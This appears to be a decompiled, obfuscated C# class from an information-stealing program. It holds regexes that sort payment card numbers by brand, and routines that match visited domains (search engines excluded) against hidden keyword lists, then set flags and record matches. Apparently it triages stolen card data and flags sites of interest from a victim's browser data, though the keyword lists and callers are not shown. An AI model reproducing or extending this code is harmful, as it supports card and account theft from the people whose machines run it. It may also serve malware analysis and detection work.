using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Text.RegularExpressions;
using ns2;

namespace ns13;

internal sealed class Class54
{
	private static Dictionary<string, Regex> dictionary_0 = new Dictionary<string, Regex>
	{
		{
			"Amex Card",
			new Regex("^3[47][0-9]{13}$")
		},
		{
			"BCGlobal",
			new Regex("^(6541|6556)[0-9]{12}$")
		},
		{
			"Carte Blanche Card",
			new Regex("^389[0-9]{11}$")
		},
		{
			"Diners Club Card",
			new Regex("^3(?:0[0-5]|[68][0-9])[0-9]{11}$")
		},
		{
			"Discover Card",
			new Regex("6(?:011|5[0-9]{2})[0-9]{12}$")
		},
		{
			"Insta Payment Card",
			new Regex("^63[7-9][0-9]{13}$")
		},
		{
			"JCB Card",
			new Regex("^(?:2131|1800|35\\\\d{3})\\\\d{11}$")
		},
		{
			"KoreanLocalCard",
			new Regex("^9[0-9]{15}$")
		},
		{
			"Laser Card",
			new Regex("^(6304|6706|6709|6771)[0-9]{12,15}$")
		},
		{
			"Maestro Card",
			new Regex("^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$")
		},
		{
			"Mastercard",
			new Regex("5[1-5][0-9]{14}$")
		},
		{
			"Solo Card",
			new Regex("^(6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15}$")
		},
		{
			"Switch Card",
			new Regex("^(4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13}$")
		},
		{
			"Union Pay Card",
			new Regex("^(62[0-9]{14,17})$")
		},
		{
			"Visa Card",
			new Regex("4[0-9]{12}(?:[0-9]{3})?$")
		},
		{
			"Visa Master Card",
			new Regex("^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$")
		},
		{
			"Express Card",
			new Regex("3[47][0-9]{13}$")
		}
	};

	private static bool smethod_0(string string_0, List<string> list_0)
	{
		string text = string_0.Replace("www.", "").ToLower();
		if (!text.Contains("google") && !text.Contains("bing") && !text.Contains("yandex") && !text.Contains("duckduckgo"))
		{
			if (text.StartsWith("."))
			{
				text = text.Substring(1);
			}
			try
			{
				text = new Uri(text).Host;
			}
			catch (UriFormatException)
			{
			}
			text = Path.GetFileNameWithoutExtension(text);
			text = text.Replace(".com", "").Replace(".org", "");
			foreach (string item in list_0)
			{
				if (text.ToLower().Replace(" ", "").Contains(item.ToLower().Replace(" ", "")))
				{
					return false;
				}
			}
			text = CultureInfo.CurrentCulture.TextInfo.ToTitleCase(text);
			list_0.Add(text);
			return true;
		}
		return false;
	}

	private static void smethod_1(string string_0)
	{
		string[] string_ = Class9.string_2;
		int num = 0;
		while (true)
		{
			if (num < string_.Length)
			{
				string value = string_[num];
				if (string_0.ToLower().Contains(value) && string_0.Length < 25 && smethod_0(string_0, Class55.list_1))
				{
					break;
				}
				num++;
				continue;
			}
			return;
		}
		Class55.bool_8 = true;
	}

	private static void smethod_2(string string_0)
	{
		string[] string_ = Class9.string_1;
		int num = 0;
		while (true)
		{
			if (num < string_.Length)
			{
				string value = string_[num];
				if (string_0.ToLower().Contains(value) && string_0.Length < 25 && smethod_0(string_0, Class55.list_0))
				{
					break;
				}
				num++;
				continue;
			}
			return;
		}
		Class55.bool_7 = true;
	}

	private static void smethod_3(string string_0)
	{
		string[] string_ = Class9.string_3;
		int num = 0;
		while (true)
		{
			if (num < string_.Length)
			{
				string value = string_[num];
				if (string_0.ToLower().Contains(value) && string_0.Length < 25 && smethod_0(string_0, Class55.list_2))
				{
					break;
				}
				num++;
				continue;
			}
			return;
		}
		Class55.bool_9 = true;
	}

	public static void smethod_4(string string_0)
	{
		smethod_2(string_0);
		smethod_1(string_0);
		smethod_3(string_0);
	}

	public static string smethod_5(string string_0)
	{
		foreach (KeyValuePair<string, Regex> item in dictionary_0)
		{
			if (item.Value.Match(string_0.Replace(" ", "")).Success)
			{
				return item.Key;
			}
		}
		return "Unknown";
	}
}
